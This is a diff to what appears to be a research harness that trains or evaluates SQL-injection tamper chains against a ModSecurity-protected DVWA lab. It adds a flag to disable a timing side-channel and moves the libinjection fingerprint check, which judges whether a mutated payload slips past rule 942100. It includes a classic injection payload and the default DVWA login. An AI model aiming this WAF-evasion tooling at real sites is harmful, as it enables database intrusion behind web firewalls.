@@ -51,6 +51,12 @@ try:
 except Exception:  # noqa: BLE001
     libinj_oracle = None
 
+# APCT timing side-channel (R_RUL). OFF by default (Minh): the timed probes + the global
+# _PROBE_LOCK serialize all parallel envs, and on a single contended host the timing is
+# CPU-load noise, not rule depth. Off => probe_pair takes the fast path (chi_MUT + one
+# status request, no lock). Set APCT_TIMING=1 to restore the faithful side-channel.
+APCT_TIMING = os.environ.get("APCT_TIMING", "0") == "1"
+
 # --- DVWA auth -------------------------------------------------------------
 
 def get_dvwa_cookie(base_url, username="admin", password="password",
@@ -222,8 +228,29 @@ def probe_pair(target, param, cookie, tamper, base_payload="1' OR '1'='1' -- -",
         return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path,
                                         urllib.parse.urlencode(q), parts.fragment))
 
-    # Decision (Minh delegated): median of N probes per payload to damp timing
-    # jitter in the APCT side-channel. Tune via APCT_PROBES.
+    # libinjection verdict on chi_MUT (modsec-faithful: replays rule 942100 transforms).
+    # libinj_sqli=False => the tamper chain pushed the fingerprint OUT of libinjection's
+    # bad-set. This is the local w1 signal for R_LIB; needed whether or not we time.
+    if libinj_oracle is not None:
+        lv = libinj_oracle.verdict(mut, modsec=True)
+        libinj_sqli, libinj_fp = lv["sqli"], lv["fingerprint"]
+    else:
+        libinj_sqli, libinj_fp = None, ""
+
+    if not APCT_TIMING:
+        # FAST PATH (R_RUL disabled, default): ONE status request for chi_MUT, no timing,
+        # no _PROBE_LOCK. Removes ~6 timed requests/step and the global serialization that
+        # was throttling the 8 parallel envs. R_RUL -> 0 (apct fields absent).
+        _, s_m = _timed_get(url_with(mut), cookie, timeout)
+        return {
+            "orig": base_payload, "mut": mut, "status_mut": s_m,
+            "libinj_sqli": libinj_sqli, "libinj_fp": libinj_fp,
+            "applied_tampers": applied, "failed_tampers": failed,
+            "changed": mut != base_payload,
+        }
+
+    # TIMED PATH (faithful APCT side-channel; enable with APCT_TIMING=1 on an uncontended
+    # host). Median of N probes per payload to damp jitter; tune via APCT_PROBES.
     nprobe = int(os.environ.get("APCT_PROBES", "3"))
 
     def timed_median(u):
@@ -234,14 +261,6 @@ def probe_pair(target, param, cookie, tamper, base_payload="1' OR '1'='1' -- -",
         t_o, s_o = timed_median(url_with(base_payload))
         t_m, s_m = timed_median(url_with(mut))
     l_o, l_m = max(1, len(base_payload)), max(1, len(mut))
-    # libinjection verdict on chi_MUT (modsec-faithful: replays rule 942100 transforms).
-    # libinj_sqli=False => the tamper chain pushed the fingerprint OUT of libinjection's
-    # bad-set => candidate to slip 942100. This is the local w1 signal for R_LIB.
-    if libinj_oracle is not None:
-        lv = libinj_oracle.verdict(mut, modsec=True)
-        libinj_sqli, libinj_fp = lv["sqli"], lv["fingerprint"]
-    else:
-        libinj_sqli, libinj_fp = None, ""
     return {
         "orig": base_payload, "mut": mut,
         "L_orig": l_o, "L_mut": l_m, "T_orig": t_o, "T_mut": t_m,
